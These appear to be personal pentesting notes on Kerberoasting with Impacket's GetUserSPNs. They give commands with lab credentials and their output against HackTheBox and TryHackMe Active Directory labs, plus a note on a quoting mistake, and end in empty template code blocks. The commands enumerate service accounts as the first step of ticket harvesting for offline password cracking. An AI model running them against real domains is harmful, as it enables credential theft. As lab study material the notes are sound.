- [Common Mistakes](#common-mistakes)
	- ['@"$t"](#t)

# Kerberoasting with GetUserSPNs

### [Kerberoast](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)

> ... to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts.

[Powershell - List all SPNs in Active Directory](https://techexpert.tips/powershell/powershell-list-all-spns-active-directory/)

### TLDR
```sh
GetUserSPNs BLACKFIELD.local/
GetUserSPNs BLACKFIELD.local/support:'#00^BlackKnight'
GetUserSPNs BLACKFIELD.local/support:'#00^BlackKnight' -usersfile users.txt
```
### Without creds; HTB Blackfield
```sh
$ GetUserSPNs BLACKFIELD.local/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```

### With creds; HTB Blackfield
```sh
$ GetUserSPNs BLACKFIELD.local/support:'#00^BlackKnight'
Impacket v0.11.0 - Copyright 2023 Fortra

No entries found!
```
### 
```

```
# [Common Mistakes](#common-mistakes-1)
## ['@"$t"](#t-1)
```sh
$ GetUserSPNs.py 'LAB.ENTERPRISE.THM/nik:ToastyBoi!'@"$t"
Impacket v0.12.0.dev1+20230823.84619.912e896 - Copyright 2023 Fortra

[-] Error in bindRequest -> invalidCredentials: 8009030C: LdapErr: DSID-0C0906B5, comment: AcceptSecurityContext error, data 52e, v4563
```

## 
```sh
$ GetUserSPNs.py 'LAB.ENTERPRISE.THM/nik:ToastyBoi!'     
Impacket v0.12.0.dev1+20230823.84619.912e896 - Copyright 2023 Fortra

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 09:20:01.333272  2021-04-26 23:16:41.570158
```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
Examples 